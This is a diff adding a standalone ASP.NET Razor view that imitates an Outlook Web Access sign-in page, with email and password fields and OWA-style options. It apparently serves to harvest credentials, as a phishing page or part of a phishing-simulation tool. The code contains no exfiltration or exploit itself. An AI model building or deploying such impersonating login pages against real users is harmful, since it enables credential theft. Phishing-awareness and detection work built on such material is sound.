@@ -1,0 +1,175 @@
+﻿
+@{
+    Layout = null;
+}
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+    <title>Outlook Web Access</title>
+    <!-- meta tags -->
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta name="robots" content="noindex,nofollow" />
+    <meta name="slurp" content="noydir" />
+    <!-- /meta tags -->
+    <link rel="stylesheet" href="Content/mail.css" type="text/css" />
+
+</head>
+
+
+<body id="owa-uas" onload="onLoad()">
+    <div style="left: 0px; top: 0px; position: fixed; overflow: hidden; z-index: -9999;" id="backstretch"><img src="Images/shapes.png" style="position: relative; width: 1920px; height: 1001.81px; left: 0px; top: -23.4026px;" /></div>
+    <script language="JavaScript">
+        function onLogIntoClick() {
+            with (document) {
+                var owaDisabled = getElementById("mmm").checked;
+                getElementById("public").disabled = owaDisabled;
+                getElementById("private").disabled = owaDisabled;
+                getElementById("owaLight").disabled = owaDisabled;
+                getElementById("owaLight").checked = false;
+                getElementById("forPublic").style.color = owaDisabled ? "gray" : "#FFFFFF";
+                getElementById("forPrivate").style.color = owaDisabled ? "gray" : "#FFFFFF";
+                getElementById("wrapOwaLight").style.color = owaDisabled ? "gray" : "#FFFFFF";
+                getElementById("rememberIdAndPswd").disabled = !owaDisabled;
+            }
+        }
+        function servicesSelectionEnable() {
+            with (document) {
+                getElementById("mmm").disabled = false;
+                getElementById("forMmm").style.color = "#FFFFFF";
+            }
+        }
+        function onSecurityClick() {
+            with (document) {
+                var isPublic = getElementById("public").checked;
+                if (isPublic) {
+                    getElementById("rememberIdAndPswd").checked = false;
+                }
+                getElementById("rememberIdAndPswd").disabled = isPublic;
+            }
+        }
+        function onRememberIdAndPswdClick() {
+            with (document) {
+                if (getElementById("rememberIdAndPswd").checked) {
+                    getElementById("rememberId").checked = true;
+                }
+            }
+        }
+        function submitDisable() {
+            with (document) {
+                var disabled = getElementById("mailbox").value == "" || getElementById("mailboxPassword").value == "";
+                var submit = getElementById("submit");
+                submit.disabled = disabled;
+            }
+        }
+        function changeDisable() {
+            var button = document.getElementById("change");
+            if (button) {
+                if (document.getElementById("frmMailBox").value == "" ||
+                    document.getElementById("frmMailBoxPassword").value == "" ||
+                    document.getElementById("mailboxNewPassword").value == "" ||
+                    document.getElementById("mailboxConfirmPassword").value == "") {
+                    button.disabled = true;
+                    button.style.color = "gray";
+                    button.style.backgroundColor = "#e4e4e4";
+                } else {
+                    button.disabled = false;
+                    button.style.color = "#000000";
+                    button.style.backgroundColor = "#FFFFFF";
+                }
+            }
+        }
+        function onLoad() {
+
+            document.login.mailbox.defaultValue = "email@domain.com";
+
+            with (document) {
+                var mumDisabled = false;
+                getElementById("mmm").disabled = mumDisabled;
+                getElementById("forMmm").style.color = mumDisabled ? "gray" : "#FFFFFF";
+                getElementById("owa").checked = true;
+                getElementById("public").checked = true;
+                getElementById("rememberId").checked = false;
+                getElementById("rememberIdAndPswd").checked = false;
+
+            }
+            onLogIntoClick();
+            onSecurityClick();
+            onRememberIdAndPswdClick();
+            submitDisable();
+            changeDisable();
+        }
+        function focusnik() {
+            if (document.login.mailbox.value == "" || document.login.mailbox.value == document.login.mailbox.defaultValue) {
+                document.login.mailbox.value = "";
+                document.login.mailbox.style.color = "#000000";
+            }
+        }
+        function onBlur() {
+            if (document.login.mailbox.value == "" || document.login.mailbox.value == document.login.mailbox.defaultValue) {
+                document.login.mailbox.value = document.login.mailbox.defaultValue;
+                document.login.mailbox.style.color = "#999";
+            }
+        }
+
+    </script>
+
+    <div id="content">
+        <h1>Outlook Web Access &amp; User Account Settings</h1>
+        <div id="loginZone" class="loginZone">
+            <form name="login" method="post" autocomplete="off">
+                <input name="mbx" type="hidden" />
+                <div id="owa-uas-login-type">
+                    <div class="form-field radio" id="ff-my-services">
+                        <label style="color: rgb(255, 255, 255);" for="mmm" id="forMmm"><big><input id="mmm" name="loginto" value="mmm" onclick="javascript:onLogIntoClick()" type="radio" /><strong>My Services</strong> settings for your mailbox</big></label>
+                    </div>
+                    <div class="form-field radio" id="ff-owa">
+                        <label for="owa" id="forOwa"><big><input checked="checked" id="owa" name="loginto" value="owa" onclick="javascript:onLogIntoClick()" type="radio" /><strong>Outlook Web Access</strong> (OWA)</big></label>
+                    </div>
+                    <div class="form-field radio" id="ff-public">
+                        <label style="color: rgb(255, 255, 255);" for="public" id="forPublic"><input checked="checked" id="public" name="security" value="public" onclick="javascript:onSecurityClick()" type="radio" />Public or shared</label>
+                    </div>
+                    <div class="form-field radio" id="ff-private">
+                        <label style="color: rgb(255, 255, 255);" for="private" id="forPrivate"><input id="private" name="security" value="private" onclick="javascript:onSecurityClick()" type="radio" />Private computer</label>
+                    </div>
+                </div>
+                <div id="owa-uas-credentials">
+                    <div class="form-field text" id="ff-email">
+                        <label for="mailbox">Email</label>
+                        <input id="mailbox" name="mailbox" value="email@domain.com" onkeypress="submitDisable();" onkeyup="submitDisable();" onkeydown="submitDisable();" onfocus="focusnik();submitDisable();" onblur="onBlur();" onchange="servicesSelectionEnable();" type="text" />
+                    </div>
+                    <div class="form-field password" id="ff-password">
+                        <label for="mailboxPassword">Password</label>
+                        <input id="mailboxPassword" name="mailboxPassword" value="" onclick="this.select();" onkeypress="submitDisable();" onkeyup="submitDisable();" onkeydown="submitDisable();" onfocus="submitDisable();" type="password" />
+                    </div>
+                </div>
+                <div id="owa-uas-pref">
+                    <div class="form-field checkbox" id="ff-remember-email">
+                        <!-- name="owa-uas-pref" -->
+                        <label><input id="rememberId" name="rememberId" onclick="javascript:onRememberIdAndPswdClick()" type="checkbox" />Remember email address</label>
+                    </div>
+                    <div class="form-field checkbox" id="ff-remember-email-password">
+                        <!-- name="owa-uas-pref" -->
+                        <label><input disabled="disabled" id="rememberIdAndPswd" name="rememberIdAndPswd" onclick="javascript:onRememberIdAndPswdClick()" type="checkbox" />Remember email address and password</label>
+                    </div>
+                    <div style="color: rgb(255, 255, 255);" class="form-field radio" id="wrapOwaLight">
+                        <!-- name="owa-uas-pref" -->
+                        <label><input id="owaLight" name="owaLight" type="checkbox" />Use Outlook Web Access Light</label>
+                    </div>
+                </div>
+                <div class="form-field" id="ff-sign-in">
+                    <button disabled="disabled" id="submit" name="submit" type="submit" value="Sign In">Sign In</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <script src="/js/jquery.js"></script>
+    <script src="js/backstretch-jquery.js"></script>
+    <script type="text/javascript">
+        $.backstretch("Images/shapes.png", { speed: 500 });
+    </script>
+
+
+</body>
+</html>
